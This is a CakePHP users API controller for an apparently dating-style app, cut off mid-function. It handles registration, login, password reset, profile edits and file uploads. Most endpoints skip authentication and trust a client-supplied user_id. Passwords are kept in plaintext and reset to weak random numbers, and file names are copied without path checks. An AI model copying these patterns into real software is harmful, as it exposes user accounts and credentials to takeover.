<?php

namespace App\Controller\Api;
use App\Controller\AppController;
use Cake\Event\Event;
use Cake\ORM\TableRegistry;
use Cake\Mailer\Email;
use Cake\Datasource\ConnectionManager;
use Cake\Database\Type;
use Cake\Auth\DefaultPasswordHasher;

class UsersController extends AppController
{

    public $helper = array('Html', 'Form');

    public function beforeFilter(Event $event)
    {
        $this->Auth->allow(['login', 'countryList', 'Register', 'VoiceUpload', 'forgotPassword', 'ChangePassword', 'editProfile', 'UsersList', 'EditAbouts', 'UploadImages', 'EditLanguageInterest', 'ProfileView', 'ReviewRating', 'aboutUs', 'ContactDetails', 'CoverPicUpload', 'ProfilePictureUpload', 'LikeDislikeService', 'UserImages', 'UserReports', 'fetchingRating', 'ContactUs', 'ManagePlans', 'loginStatus', 'BlockUser', 'TimeDifference']);
    }

            
    public function initialize()
    {
        parent::initialize();
        $this->loadComponent('RequestHandler'); 
        $this->loadComponent('Auth', [
                'loginAction' => [
                    'controller' => 'users',
                    'action' => 'login',
                ],
                'authError' => 'Did you really think you are allowed to see that?',
                'authenticate' => [
                    'Form' => [
                        'fields' => ['username' => 'email', 'password' => 'password'],
                        // 'userModel' => 'Admins',
                        // 'finder' => 'auth'
                    ]
                ],
                'storage' => 'Session'
            ]);
    }

    

    ##################### Saving Users Data ##############

    function userregApi($data = null)
    {
        $this->loadModel('Users');
        if(!empty($data)) {
            $data['email'] = trim($data['email']);
            $data['decode_password'] = $data['password'];
            $data['user_type'] = "user";
            $userInfo = $this->Users->newEntity($data);
            if($this->Users->save($userInfo)) {
                $id = $userInfo->id;
                $uid = base64_encode(convert_uuencode($id));
                $email = sha1($data['email']);
                $this->userRegMail($uid,$email,$data);
                return $id;
            }
        }
    }

    ################ Start Registration Function ##############

    public function Register()
    {
        if( $this->request->is(['post']) )
        {
            $data = $this->request->data;
            /*if( !empty($data['user_name']) && !empty($data['email']) && !empty($data['password']) && !empty($data['phone']) && !empty($data['socal_status']) && !empty($data['search_criteria']) && !empty($data['age']) && !empty($data['description']) && !empty($data['gender']) && !empty($data['country_id']) )
            {*/
                $this->loadModel('Users');
                $EmailExists=$this->Users->find()
                            ->where(['email'=>$data['email']])
                            ->select(['id','email'])
                            ->first();
                if( !empty($EmailExists) )
                {
                    $result['message']="Email Already Exists";
                    $result['status']=0;
                }
                else
                {
                    $ContactExists=$this->Users->find()
                                  ->where(['email'=>$data['email']])
                                  ->select(['id','email'])
                                  ->first();
                    if( !empty($ContactExists) )
                    {
                        $result['message']="Contact Already Exists";
                        $result['status']=0;
                    }
                    else
                    {
                        $userInfo = $this->userregApi($data);
                        if( !empty($data['image']) && !empty($_FILES['image']['tmp_name']) )
                        {
                            $logo        = $_FILES['image']['name'];
                            $logo        = $this->Utility->sanitizeFilename($logo);
                            $logo        = $this->Utility->randomString() . '-' . $logo;
                            $sourcePath  = $_FILES['image']['tmp_name'];
                            $targetPath  = '../webroot/img/profilePic/'.$logo;
                            if(is_uploaded_file($sourcePath)) 
                            {
                                $this->Resize->resize($sourcePath,$targetPath,'aspect_fit',250,250, 0, 0, 0, 0 );
                                $info['Users']['id'] = $userInfo;
                                $info['Users']['image'] = $logo; 
                                $user_info1 = $this->Users->newEntity($info);
                                $this->Users->save($user_info1);
                            }
                        }
                        $result['message'] = "Success";
                        $result['status']  = 1;
                        $result['user_id'] = $userInfo;
                        $result['gender']  = $data['gender'];
                    }
                }
            /*}
            else
            {
                $result['message'] = "Field Required";
                $result['status']  = 0;
            }*/
            echo json_encode($result,JSON_PRETTY_PRINT); die;
        }
    }

    ####################### Email Verification ##################

    function userRegMail($uid = null, $email = null,$data = null) 
    {
        $template = TableRegistry::get('EmailTemplates');
        $queryInfo = $template
        ->find()
        ->where(array(
                'id' =>'6'
            )
        ); 
        // $token = base64_encode(convert_uuencode(time())); 
        $link = '<a href="'.HTTP_ROOT.'home/verify_email/'.$uid.'/'.$email.'">Click Here</a>';               
        $templateInfo = $queryInfo->first();
        $emailContent = $templateInfo['html_content'];
        $emailContent = str_replace('{username}',$data['user_name'], $emailContent);
        $emailContent = str_replace('{link}',$link, $emailContent);
        $email = new Email();
        $email->viewVars(['emailContent' => $emailContent]);
        // prx($emailContent);
        $email->template('common_template','default')
              ->emailFormat('html')
              ->to($data['email'])
              ->from($templateInfo['from_email'],$templateInfo['from_name'])
              ->subject($templateInfo['subject'])
              ->send();
    }

    ################# Country List ######################

    public function countryList()
    {
        if($this->request->is(['get']))
        {
            $this->loadModel('Countries');
            $countryInfo = $this->Countries->activeCountry();
            if( !empty($countryInfo) )
            {
                $result['message']="Success";
                $result['status']=1;
                $result['country']=$countryInfo;
            }
            else
            {
                $result['message']="error";
                $result['status']=0;
                $result['country']=[];
            }
            echo json_encode($result); 
        }
        die;
    }

    ############## Login ##########################

    public function login()
    {
        if( $this->request->is(['post']) )
        {
            $data = $this->request->data;
            if( !empty($data['email']) && !empty($data['password']) )
            {
                $this->loadModel('Users');
                $user = $this->Auth->identify();
                //prx($user);
                if( !empty($user) )
                {
                    if( $user['status'] == "Active" && $user['email_verify'] == 1 )
                    {
                        $result['Users']['id']              = $user['id'];
                        $result['Users']['user_name']       = $user['user_name'];
                        $result['Users']['age']             = $user['age'];
                        $result['Users']['gender']          = $user['gender'];
                        $result['Users']['age']             = $user['age'];
                        $result['Users']['email']           = $user['email'];
                        $result['Users']['image']           = $user['image'];
                        $result['Users']['phone']           = $user['phone'];
                        $result['Users']['socal_status']    = $user['socal_status'];
                        $result['Users']['search_criteria'] = $user['search_criteria'];
                        $result['Users']['description']     = $user['description'];
                        $result['Users']['voice_message']   = $user['voice_message'];
                        $this->loadModel("Countries");
                        $countryName = $this->Countries->find()
                                     ->where(['id'=>$user['country_id']])
                                     ->select(['id', 'country_name'])
                                     ->first();
                        $result['Users']['country_id']      = $user['country_id'];
                        if($user)
                        {
                            $loginTime = date('Y-m-d H:i:s');
                            $query = $this->Users->query();
                            $userLoginUpdate = $query->update()
                                             ->set(['last_login' => $loginTime,'login_status'=>1])
                                             ->where(['id' => $user['id']])
                                             ->execute();
                            $result['message']="Success";
                            $result['status']=1;
                        }
                    }
                    else
                    {
                        $result['message'] = "Login Into Your Register Mailed And Verify The User First";
                        $result['status']  = 0;
                    }
                }
                else
                {
                    $result['message']  = "Email or password doesn't Matched";
                    $result['status']   = 0;
                }
            }
            else
            {
                $result['message'] = "Field Required";
                $result['status']  = 0;
            }
            echo json_encode($result, JSON_PRETTY_PRINT);
            die;
        }
        die;
    }

    ##################### Voice Message Upload ###################

    public function VoiceUpload()
    {
        if( $this->request->is(['post']) )
        {
            $data=$this->request->data;
            if( !empty($data['user_id']) )
            {
                $this->loadModel('Users');
                $voiceMessage=$this->Users->find()
                             ->where(['id'=>$data['user_id']])
                             ->select(['id','voice_message'])
                             ->first();
                if(isset($data['voice_upload']['name'])) 
                {                    
                    if (!empty($data['voice_upload']['name'])) 
                    {
                        $vmsg = $data['voice_upload']['name'];
                        $ext = explode('.', $vmsg);
                        if($ext[1] == 'wav' || $ext[1] == 'mp3' || $ext[1] == '3gp') 
                        {
                            $target = realpath('../webroot/img/voiceMessage').'/';
                            $tempFile = $data['voice_upload']['tmp_name'];
                            $msg = $this->Utility->randomString() . '-' . $data['voice_upload']['name'];
                            move_uploaded_file($tempFile, $target.$msg);
                            if( !empty($voiceMessage['voice_message']) )
                            {
                                $RemoveFile = '../webroot/img/voiceMessage/'.$voiceMessage['voice_message'];
                                unlink($RemoveFile);
                            }
                            $info['id'] = $data['user_id'];
                            $info['voice_message'] = $msg; 
                            $user_info1 = $this->Users->newEntity($info);
                            $this->Users->save($user_info1);
                            $result['message'] = "Success";
                            $result['status']  = 1;
                            $result['voice_message'] = $msg;
                        }
                        else
                        {
                            $result['message']="Please Upload voice file";
                            $result['status']=0;
                        }
                    }
                }               
            }
            else
            {
                $result['message'] = "Field Required";
                $result['status']  = 0;
            }
            echo json_encode($result, JSON_PRETTY_PRINT); die;
        }
    }

    public function forgotPassword()
    {
        $this->loadModel('Users');
        if($this->request->is(['post'])) 
        {
            $data = $this->request->data;
            if(isset($data['email']) && !empty($data['email']))
            {
                $this->loadModel('Users');
                $check = $this->forgotPass($data['email']); 
                if($check == "success")
                {
                    $result['message']="Success Please Check Your Email";
                    $result['status']=1;
                }
                else
                {
                    $result['message']="Failure";
                    $result['status']=0;
                }
            }
            echo json_encode($result, JSON_PRETTY_PRINT);die;        
        }
    }

    function forgotPass($email = null)
    {
        if( !empty($email) ) 
        {
            $user_info = $this->Users->find()
                       ->where(['email'=>$email])
                       ->hydrate(false)
                       ->first();
            if( isset($user_info) && !empty($user_info) ) 
            {   
                $this->sendForgotPasswordNewPassword($user_info);
                return 'success';
            } 
            else 
            {
                return 'failure';
            }   
        }
    }

    ###################### Sending the New Password In Email ###################

    function sendForgotPasswordNewPassword($info) 
    {   
        $this->loadModel('Users');
        $uid = base64_encode(convert_uuencode($info['id']));
        $email = sha1($info['email']);
        $template = TableRegistry::get('EmailTemplates');
        $queryInfo = $template
        ->find()
        ->where(array(
                'id' =>'8'
            )
        );
        $token = base64_encode(convert_uuencode(time()));
        $password =rand(0,100000);
        //$root = HTTP_ROOT.'home/resetPassword/'.$uid.'/'.$email.'/'.$token;
        $temp1['Users']['id'] = $info['id'];
        $temp1['Users']['activation_key']   = $token;
        $temp1['Users']['password']         = $password;
        $temp1['Users']['decode_password']  = $password;
        $userinfo = $this->Users->newEntity($temp1);
        $this->Users->save($userinfo);       
        //$resetPasswordLink = '<a href="'.$root.'">Click here to reset password</a>';            
        $templateInfo = $queryInfo->first();
        $emailContent = $templateInfo['html_content'];
        $emailContent = str_replace('{username}',$info['user_name'], $emailContent);
        $emailContent = str_replace('{password}',$password, $emailContent);
        // $emailContent = str_replace('{email}',$info['email'], $emailContent);
        $email = new Email();
        $email->viewVars(['emailContent' => $emailContent]);
        $email->template('common_template','default')
            ->emailFormat('html')
            ->to($info['email'])
            ->from($templateInfo['from_email'],$templateInfo['from_name'])
            ->subject($templateInfo['subject'])
            ->send();
    }

    ##################### Change Password  ####################################

    public function ChangePassword()
    {
        $this->loadModel('Users');
        if( $this->request->is(['post']) )
        {
            $data = $this->request->data;
            if( !empty($data['old_password']) && !empty($data['new_password']) && !empty($data['user_id']) )
            {
                $users_details = $this->Users->find()
                               ->where(['id'=>$data['user_id']])
                               ->select(['password','id','decode_password'])
                               ->first();
                if( !empty($users_details) )
                {
                    if( $users_details['decode_password'] == $data['old_password'] )
                    {
                        $password                           = $data['new_password'];
                        $temp1['Users']['id']               = $users_details['id'];
                        $temp1['Users']['password']         = $password;
                        $temp1['Users']['decode_password']  = $password;
                        $user_info1                         = $this->Users->newEntity($temp1);
                        
                        $this->Users->save($user_info1);
                        
                        $result['message']  = "success";
                        $result['status']   = 1;
                    }
                    else
                    {
                        $result['message']  = "Old Password not matched";
                        $result['status']   = 0;
                    }
                }
                else
                {
                    $result['message']      = "User not found";
                    $result['status']       = 0;
                }
            }
            else
            {
                $result['message'] = "Field Required";
                $result['status']  = 0;
            }
            echo json_encode($result, JSON_PRETTY_PRINT); die;
        }
    }

    ###################### Edit Profile ########################

    public function editProfile()
    {
        if( $this->request->is(['post']) )
        {
            $data=$this->request->data;
            $this->loadModel("Users");
            if( !empty($data['user_id']) && !empty($data['email']) && !empty($data['phone']) )
            {
                $user_data   = $this->Users->get($data['user_id']);
                $check_email = $this->Users->find()
                             ->where(['email'=>$data['email'],'id NOT IN'=>$data['user_id']])
                             ->hydrate(false)
                             ->first();

                if( !empty($check_email) )
                {
                    $result['message'] = "Email Id Already exists";
                    $result['status']  = 0;
                }
                else
                {
                    $check_Contact = $this->Users->find()
                                   ->where(['phone'=>trim($data['phone']),'id NOT IN'=>trim($data['user_id'])])
                                   ->hydrate(false)
                                   ->first();
                    if( !empty($check_Contact) )
                    {
                        $result['message'] = "Contact already Exists";
                        $result['status']  = 0;
                    }
                    else
                    {
                        $editProfileDetails = $this->Users->patchEntity($user_data, $data);
                        if( $this->Users->save($editProfileDetails) )
                        {
                            $result['message'] = "Success";
                            $result['status']  = 1;
                            $result['Users']   = $editProfileDetails;
                            unset($result['Users']['password'], $result['Users']['decode_password'], $result['Users']['plan_expire_date'], $result['Users']['login_update_time'], $result['Users']['users_like'], $result['Users']['user_id'], $result['Users']['last_logout'], $result['Users']['last_login']);
                        }
                        else
                        {
                            $result['message'] = "Details not saved";
                            $result['status']  = 0;
                            $result['Users']   = [];
                        }
                    }
                }
            }
            else
            {
                $result['message'] = "Field Required";
                $result['status']  = 0;
            }
            echo json_encode($result, JSON_PRETTY_PRINT); die;
        }
    }

    ############################ Edit AboutUs Section ####################

    public function EditAbouts()
    {
        if( $this->request->is(['post']) )
        {
            $data = $this->request->data;
            if( !empty($data['user_id']) && !empty($data['description']) )
            {
                $this->loadModel('Users');
                $userDetails = $this->Users->find()
                             ->where(['id'=>$data['user_id']])
                             ->select(['id', 'description'])
                             ->first();
                if( !empty($userDetails) )
                {
                    $query = $this->Users->query();
                    $query->Update()
                          ->set(['description' => $data['description']])
                          ->where(['id'=>$data['user_id']])
                          ->execute();
                    $result['message']          = "Success";
                    $result['status']           = 1;
                    $result['Users']['id']      = $data['user_id'];
                    $result['Users']['about']   = $data['description'];
                }
                else
                {
                    $result['message']          = "Error";
                    $result['status']           = 0;
                }
            }
            else
            {
                $result['message'] = "Field Required";
                $result['status']  = 0;
            }
        }
        echo json_encode($result, JSON_PRETTY_PRINT); die;
    }

    ################     Edit Language and interest   #######################

    public function EditLanguageInterest()
    {
        if( $this->request->is(['post','put']) )
        {
            $data = $this->request->data;
            if(!empty($data['user_id']) && !empty($data['language']) && !empty($data['interest']))
            {
                $query = $this->Users->query();
                $query->Update()
                      ->set(['language' => $data['language'], 'interest' => $data['interest'] ])
                      ->where(['id' => $data['user_id']])
                      ->execute();
                $result['status']               = 1;
                $result['message']              = "success";
                $result['Users']['id']          = $data['user_id'];
                $result['Users']['language']    = $data['language'];
                $result['Users']['interest']    = $data['interest'];
            }
            else
            {
                $result['message'] = "Field Required";
                $result['status']  = 0;
            }
            echo json_encode($result, JSON_PRETTY_PRINT); die;
        }
    }

    public function UploadImages()
    {
        if( $this->request->is(['post']) )
        {
            $data = $this->request->data;
            $this->loadModel('UserPictures');
            if( !empty($data['user_id']) && !empty($data['image']) )
            {
                if( !empty($data['image']) && !empty($_FILES['image']['tmp_name']) )
                {
                    $logo        = $_FILES['image']['name'];
                    $logo        = $this->Utility->sanitizeFilename($logo);
                    $logo        = $this->Utility->randomString() . '-' . $logo;
                    $sourcePath  = $_FILES['image']['tmp_name'];
                    $targetPath  = '../webroot/img/uploadGalary/'.$logo;
                    if(is_uploaded_file($sourcePath)) 
                    {
                        $this->Resize->resize($sourcePath,$targetPath,'aspect_fit',250,250, 0, 0, 0, 0 );
                        $data['image'] = $logo;
                        $userPictures = $this->UserPictures->newEntity($data);
                        if( $this->UserPictures->save($userPictures) )
                        {
                            $result['message'] = "success";
                            $result['status']  = 1;
                            $result['image']   = $logo;
                        }
                        else
                        {
                            $result['message'] = "error";
                            $result['status']  = 0;
                            $result['image']   = "";
                        }
                    }
                }
                else
                {
                    $result['message'] = " Field Required ";
                    $result['status']  = 0;
                }
            }
            else
            {
                $result['message'] = "Field Required";
                $result['status']  = 0;
            }
        }
        echo json_encode($result, JSON_PRETTY_PRINT); die;
    }

    ########################## All Active Users Listing ################

    /*public function UsersList()
    {
        if( $this->request->is(['post']) )
        {
            $this->loadModel('Users');
            $this->loadModel("UserLikes");
            $this->loadModel("UserDislikes");
            $data = $this->request->data;
            if( !empty($data['country_id']) && !empty($data['start_age']) && !empty($data['end_age']) && !empty($data['looking']) )
            {
                $UsersList = $this->Users->find()
                           ->contain(['Countries'])
                           ->where(['Users.status'=>"Active",'Users.email_verify'=>1,'Users.age >='=>$data['start_age'],'Users.age <='=>$data['end_age'],'country_id'=>$data['country_id'],'gender'=>$data['looking']])
                           ->select(['Users.id', 'Users.user_type', 'Users.user_name', 'Users.age', 'Users.gender' ,'Users.email', 'Users.image', 'Users.cover_pic', 'Users.phone', 'Users.socal_status', 'Users.search_criteria', 'Users.language', 'Users.interest', 'Users.voice_message', 'Users.description', 'Users.address', 'Users.country_id', 'Users.users_like', 'Users.users_dislike', 'Users.views','Countries.id', 'Countries.sortname', 'Countries.country_name', 'Countries.currency','Countries.status'])
                           ->toArray();
            }
            else
            {
                $UsersList = $this->Users->find('all')
                           ->contain(['Countries'])
                           ->where(['Users.status'=>"Active",'Users.email_verify'=>1])
                           ->select(['Users.id', 'Users.user_type', 'Users.user_name', 'Users.age', 'Users.gender' ,'Users.email', 'Users.image', 'Users.cover_pic', 'Users.phone', 'Users.socal_status', 'Users.search_criteria', 'Users.language', 'Users.interest', 'Users.voice_message', 'Users.description', 'Users.address', 'Users.country_id', 'Users.users_like', 'Users.users_dislike', 'Users.views','Countries.id', 'Countries.sortname', 'Countries.country_name', 'Countries.currency','Countries.status'])
                           ->toArray();
            }
            if( !empty($UsersList) )
            {
                if( !empty($data['user_id']) )
                {
                    $this->loadModel('BlockUsers');
                    $UserBy = $this->BlockUsers->find()
                            ->where(['user_by' => $data['user_id']])
                            ->orWhere(['user_to' => $data['user_id']])
                            ->select(['user_by', 'user_to'])
                            ->toArray();
                    //pr($UserBy);die;
                    foreach($UserBy as $userData)
                    {
                        $userBy[] = $userData['user_by'];
                        $userTo[] =$userData['user_to'];  
                    }
                    $BlockedUserArray = array_merge($userBy,$userTo);
                    //pr($BlockedUserArray);die;
                }
                $result['message'] = "Success";
                $result['status']  = 1;
                //$result['Users']   = $UsersList;
                if( !empty($data['user_id']) )
                {
                    foreach($UsersList as $key => $list)
                    {
                        if( !in_array($list['id'],$BlockedUserArray) )
                        {
                            $result['Users']   = $UsersList;
                            $checkingLike =$this->UserLikes->find()
                                          ->where(['liked_user_id'=>$data['user_id'],'user_id'=>$list['id']])
                                          ->first();
                            if( !empty($checkingLike) )
                            {
                                $result['Users'][$key]['liked_status'] = 1;
                            }
                            else
                            {
                                $result['Users'][$key]['liked_status'] = 0;
                            }

                            $checkingDisLike = $this->UserDislikes->find()
                                             ->where(['dislike_user_id' => $data['user_id'],'user_id'=>$list['id']])
                                             ->first();
                            if( !empty($checkingDisLike) )
                            {
                                $result['Users'][$key]['disliked_status'] = 1;
                            }
                            else
                            {
                                $result['Users'][$key]['disliked_status'] = 0;
                            }
                        }
                    }
                }
                else
                {
                    $result['Users']   = $UsersList;
                }
            }
            else
            {
                $result['message'] = "No Record Found";
                $result['status']  = 0;
                $result['Users']   = [];
            }
            echo Json_encode($result, JSON_PRETTY_PRINT); die;
        }
    }
*/

    ########################  UserList With Block Functionality #######################

    public function UsersList()
    {
        $this->loadModel("Users");
        $this->loadModel("Countries");
        if( $this->request->is(['post','put']) )
        {
            $data = $this->request->data;
            $this->loadModel('Users');
            $this->loadModel("UserLikes");
            $this->loadModel("UserDislikes");
            $data = $this->request->data;
            if( !empty($data['country_id']) && !empty($data['start_age']) && !empty($data['end_age']) && !empty($data['looking']) )
            {
                $UsersList = $this->Users->find()
                           ->contain(['Countries'])
                           ->where(['Users.status'=>"Active",'Users.email_verify'=>1,'Users.age >='=>$data['start_age'],'Users.age <='=>$data['end_age'],'country_id'=>$data['country_id'],'gender'=>$data['looking']])
                           ->select(['Users.id', 'Users.user_type', 'Users.user_name', 'Users.age', 'Users.gender' ,'Users.email', 'Users.image', 'Users.cover_pic', 'Users.phone', 'Users.socal_status', 'Users.search_criteria', 'Users.language', 'Users.interest', 'Users.voice_message', 'Users.description', 'Users.address', 'Users.country_id', 'Users.users_like', 'Users.users_dislike', 'Users.views','Countries.id', 'Countries.sortname', 'Countries.country_name', 'Countries.currency','Countries.status', 'login_status', 'login_update_time'])
                           ->toArray();
            }
            else
            {
                $UsersList = $this->Users->find('all')
                           ->contain(['Countries'])
                           ->where(['Users.status'=>"Active",'Users.email_verify'=>1 ])
                           ->select(['Users.id', 'Users.user_type', 'Users.user_name', 'Users.age', 'Users.gender' ,'Users.email', 'Users.image', 'Users.cover_pic', 'Users.phone', 'Users.socal_status', 'Users.search_criteria', 'Users.language', 'Users.interest', 'Users.voice_message', 'Users.description', 'Users.address', 'Users.country_id', 'Users.users_like', 'Users.users_dislike', 'Users.views','Countries.id', 'Countries.sortname', 'Countries.country_name', 'Countries.currency','Countries.status', 'login_status', 'login_update_time'])
                           ->toArray();
            }
            # checking the userlist is empty or not

            if( !empty($UsersList) )
            {
                # If we are passing the user id then we are sending the like dislike status .

                if( !empty($data['user_id']) )
                {
                    $this->loadModel('BlockUsers');
                    $UserBy = $this->BlockUsers->find()
                            ->where(['user_by' => $data['user_id']])
                            ->orWhere(['user_to' => $data['user_id']])
                            ->select(['user_by', 'user_to'])
                            ->toArray();
                    foreach($UserBy as $userData)
                    {
                        $userBy[] = $userData['user_by'];
                        $userTo[] =$userData['user_to'];  
                    }
                    $BlockedUserArray = array_merge($userBy,$userTo);
                    foreach($UsersList as $key => $list)
                    {
                        if(!in_array($list['id'],$BlockedUserArray))
                        {
                            $result['Users'][$key]   = $list;
                            /*$checkingLike =$this->UserLikes->find()
                                          ->where(['liked_user_id'=>$data['user_id'],'user_id'=>$list['id']])
                                          ->first();
                            if( !empty($checkingLike) )
                            {
                                $result['Users'][$key]['liked_status'] = 1;
                            }
                            else
                            {
                                $result['Users'][$key]['liked_status'] = 0;
                            }

                            $checkingDisLike = $this->UserDislikes->find()
                                             ->where(['dislike_user_id' => $data['user_id'],'user_id'=>$list['id']])
                                             ->first();
                            if( !empty($checkingDisLike) )
                            {
                                $result['Users'][$key]['disliked_status'] = 1;
                            }
                            else
                            {
                                $result['Users'][$key]['disliked_status'] = 0;
                            }*/
                        }
                    }
                    $result['Users'] = array_values($result['Users']);
                    if( !empty($result['Users']) )
                    {
                        foreach($result['Users'] as $key => $list2)
                        {
                            $checkingLike =$this->UserLikes->find()
                                          ->where(['liked_user_id'=>$data['user_id'],'user_id'=>$list2['id']])
                                          ->first();
                            if( !empty($checkingLike) )
                            {
                                $result['Users'][$key]['liked_status'] = 1;
                            }
                            else
                            {
                                $result['Users'][$key]['liked_status'] = 0;
                            }
                            $current_time =date('Y-m-d H:i:s');
                            if( !empty($list2['login_update_time']) )
                            {

                                $result['Users'][$key]['last_online'] = $this->TimeDifference($current_time,$list2['login_update_time']);
                            }
                            else
                            {
                                $result['Users'][$key]['last_online'] = 0;
                            }
                            $checkingDisLike = $this->UserDislikes->find()
                                             ->where(['dislike_user_id' => $data['user_id'],'user_id'=>$list2['id']])
                                             ->first();
                            if( !empty($checkingDisLike) )
                            {
                                $result['Users'][$key]['disliked_status'] = 1;
                            }
                            else
                            {
                                $result['Users'][$key]['disliked_status'] = 0;
                            }
                        }
                        $result['message'] = "Success";
                        $result['status']  = 1;
                    }
                }
                else
                {
                    $result['Users']   = $UsersList;
                    $result['message'] = " Success ";
                    $result['status']  = 1;
                }
            }
            else
            {
                $result['message'] = "Record Not Found";
                $result['status']  = 0;
                $result['Users']   = [];
            }

            echo Json_encode($result, JSON_PRETTY_PRINT); die;
        }
    }

    public function ProfileView()
    {
        if($this->request->is( ['post','put']) )
        {
            $data = $this->request->data;
            if( !empty($data['user_id']) )
            {
                $this->loadModel("Users");
                $userDetails = $this->Users->find()
                             ->where(['Users.id'=>$data['user_id']])
                             ->contain(['Countries', 'UserPictures'])
                             ->first();

                $reviews   = $this->loadModel('Reviews');
                $query     = $reviews->find()->where(['user_rating_id'=>$data['user_id'],'status'=>"Active"]);
                $avgRating = $query->select(['avg' => $query->func()->avg('rating')])->first();
                if( !empty($userDetails) )
                {
                    $result['message'] = "Success";
                    $result['status']  = 1;
                    $result['Users']   = $userDetails;
                    if( !empty($avgRating['avg']) )
                    {
                       $result['Users']['avg_rating'] = $avgRating['avg']; 
                    }
                    else
                    {
                        $result['Users']['avg_rating'] = 0;
                    }
                    
                    unset($result['Users']['password'], $result['Users']['decode_password'], $result['Users']['plan_expire_date'], $result['Users']['user_id'], $result['Users']['last_logout'], $result['Users']['last_login']);
                }
                else
                {
                    $result['message'] = "error";
                    $result['status']  = 0;
                    $result['Users']   = [];
                }
            }
            else
            {
                $result['message'] = "Field Required";
                $result['status']  = 0;
            }
        }
        echo Json_encode($result, JSON_PRETTY_PRINT); die;
    }

    public function ReviewRating()
    {
        $this->loadModel('Reviews');
        if( $this->request->is(['post']) )
        {
            $data = $this->request->data;
            if( !empty($data['user_id']) && !empty($data['user_rating_id']) && !empty($data['rating']) )
            {
                $CheckingAlreadyExists = $this->Reviews->find()
                                       ->where(['user_id'=>$data['user_id'], 'user_rating_id'=>$data['user_rating_id']])
                                       ->first();
                if( !empty($CheckingAlreadyExists) )
                {
                    $result['message'] = "Already Rated";
                    $result['status']  = 0;
                }
                else
                {
                    $rating = $this->Reviews->newEntity($data);
                    if( $this->Reviews->save($rating) )
                    {
                        $result['message'] = "Successfully Rated";
                        $result['status']  = 1;
                    }
                    else
                    {
                        $result['message'] = "Rated not success";
                        $result['status']  = 0;
                    }
                } 
            }
            else
            {
                $result['message'] = "Field Required";
                $result['status']  = 0;
            }
        }
        echo json_encode($result, JSON_PRETTY_PRINT); die;
    }

    public function aboutUs()
    {
        $this->loadModel("AboutUs");
        if( $this->request->is(['get']) )
        {
            $aboutUsDetails = $this->AboutUs->find()
                            ->where(['id'=>1])
                            ->first();
            if( !empty($aboutUsDetails) )
            {
                $result['message']                   = "success";
                $result['status']                    = 1;
                $result['Abouts']['id']              = $aboutUsDetails['id'];
                $result['Abouts']['sub_title']       = $aboutUsDetails['sub_title'];
                $result['Abouts']['description']     = str_replace("<p>","", $aboutUsDetails['description']);
                $result['Abouts']['description']     = str_replace("</p>","", $aboutUsDetails['description']);
                $result['Abouts']['description_two'] = str_replace("<p>","", $aboutUsDetails['description_two']);
                $result['Abouts']['description_two'] = str_replace("</p>","", $aboutUsDetails['description_two']);
                $result['Abouts']['image']           = $aboutUsDetails['image'];
            }
            else
            {
                $result['message']                   = "error";
                $result['status']                    = 0;
            }
        }
        echo json_encode($result, JSON_PRETTY_PRINT);die;
    }

    public function CoverPicUpload()
    {
        $this->loadModel("Users");
        if( $this->request->is(['post','put']) )
        {
            $data = $this->request->data;
            if( !empty($data['image']) && !empty($data['user_id']) )
            {
                if( !empty($_FILES['image']['tmp_name']) )
                {
                    $logo        = $_FILES['image']['name'];
                    $logo        = $this->Utility->sanitizeFilename($logo);
                    $logo        = $this->Utility->randomString() . '-' . $logo;
                    $sourcePath  = $_FILES['image']['tmp_name'];
                    $targetPath  = '../webroot/img/coverPic/'.$logo;
                    if(is_uploaded_file($sourcePath)) 
                    {
                        $this->Resize->resize($sourcePath,$targetPath,'aspect_fit',250,250, 0, 0, 0, 0 );
                        $data['image'] = $logo;
                        //$userPictures = $this->UserPictures->newEntity($data);
                        $query = $this->Users->query();
                        $query->Update()
                              ->set(['cover_pic'=>$logo])
                              ->where(['id'=>$data['user_id']])
                              ->execute();
                        $result['message'] = "success";
                        $result['status']  = 1;
                        $result['image']   = $logo;
                    }
                }
            }
            elseif( !empty($data['image_id']) && !empty($data['image_name']) && !empty($data['user_id']))
            {
                //echo HTTP_ROOT.'img/uploadGalary/'.$data['image_name'];die;
                if(file_exists('img/uploadGalary/'.$data['image_name']))
                {
                    $FilePath   = 'img/uploadGalary/'.$data['image_name'];
                    $TargetPath = 'img/coverPic/'.$data['image_name'];
                    copy($FilePath, $TargetPath);
                    // echo "File Successfully Moved"; die;
                    $query = $this->Users->query();
                    $query->Update()
                          ->set(['cover_pic'=>$data['image_name']])
                          ->where(['id'=>$data['user_id']])
                          ->execute();
                    $result['message'] = "File Successfully Moved";
                    $result['status']  = 1;
                }
                else
                {
                    $result['message'] = "File Not Exists";
                    $result['status']  = 0;
                }
            }
            else
            {
                $result['message'] = "Field Required ";
                $result['status']  = 0;
            }
        }
        echo json_encode($result, JSON_PRETTY_PRINT); die;
    }

    public function ProfilePictureUpload()
    {
        $this->loadModel('Users');
        if( $this->request->is(['post']) )
        {
            $data = $this->request->data;
            if( !empty($data['image']) && !empty($data['user_id']) )
            {
                if( !empty($_FILES['image']['tmp_name']) )
                {
                    $logo        = $_FILES['image']['name'];
                    $logo        = $this->Utility->sanitizeFilename($logo);
                    $logo        = $this->Utility->randomString() . '-' . $logo;
                    $sourcePath  = $_FILES['image']['tmp_name'];
                    $targetPath  = '../webroot/img/profilePic/'.$logo;
                    if(is_uploaded_file($sourcePath)) 
                    {
                        $this->Resize->resize($sourcePath,$targetPath,'aspect_fit',250,250, 0, 0, 0, 0 );
                        $data['image'] = $logo;
                        //$userPictures = $this->UserPictures->newEntity($data);
                        $query = $this->Users->query();
                        $query->Update()
                              ->set(['image' => $logo])
                              ->where(['id'  => $data['user_id']])
                              ->execute();
                        $result['message'] = "success";
                        $result['status']  = 1;
                        $result['image']   = $logo;
                    }
                }
            }
            elseif( !empty($data['image_id']) && !empty($data['image_name']) && !empty($data['user_id']) )
            {
                if( file_exists('img/uploadGalary/'.$data['image_name']) )
                {
                    $FilePath   = 'img/uploadGalary/'.$data['image_name'];
                    $TargetPath = 'img/profilePic/'.$data['image_name'];
                    copy($FilePath, $TargetPath);
                    $query = $this->Users->query();
                    $query->Update()
                          ->set(['image'=> $data['image_name']])
                          ->where(['id' => $data['user_id']])
                          ->execute();
                    $result['message'] = "File Successfully Moved";
                    $result['status']  = 1;
                }
                else
                {
                    $result['message'] = "File Not Exists";
                    $result['status']  = 0;
                }
            }
            else
            {
                $result['message'] = "Field Required";
                $result['status']  = 0;
            }
        }
        echo json_encode($result, JSON_PRETTY_PRINT); die;
    }

    public function ContactDetails()
    {
        if( $this->request->is(['post','put']) )
        {
            $data = $this->request->data;
